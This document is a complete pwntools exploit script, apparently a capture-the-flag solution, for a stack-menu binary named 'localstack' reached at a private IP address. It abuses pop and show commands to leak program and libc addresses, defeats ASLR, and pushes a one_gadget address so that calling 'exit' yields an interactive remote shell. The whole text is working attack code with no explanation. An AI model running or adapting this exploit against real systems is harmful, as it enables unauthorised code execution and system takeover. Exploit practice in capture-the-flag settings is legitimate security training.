from pwn import *
exe = context.binary = ELF("./localstack", checksec=False)
r = process(exe.path)
r = remote('172.31.1.2', 11100)
r.sendlineafter(b'>> ', b'pop')
r.sendlineafter(b'>> ', b'pop')
r.sendlineafter(b'>> ', b'show')
exe_addr = int(r.recvline().split()[-1].decode()) - 0x149f
r.sendlineafter(b'>> ', b'push 0')
r.sendlineafter(b'>> ', b'push 31')
r.sendlineafter(b'>> ', b'pop')
libc_addr = int(r.recvline().split()[1].decode()) - 0x2a1ca

bss = exe_addr + 0x4100
one_gadget = libc_addr + 0xef52b
print(f"{hex(libc_addr) =  }")
print(f"{hex(bss) =        }")
print(f"{hex(one_gadget) = }")
r.sendlineafter(b'>> ', b'pop')
r.sendlineafter(b'>> ', b'push ' + str(bss).encode())
r.sendlineafter(b'>> ', b'push ' + str(one_gadget).encode())
r.sendlineafter(b'>> ', b'exit')
r.interactive()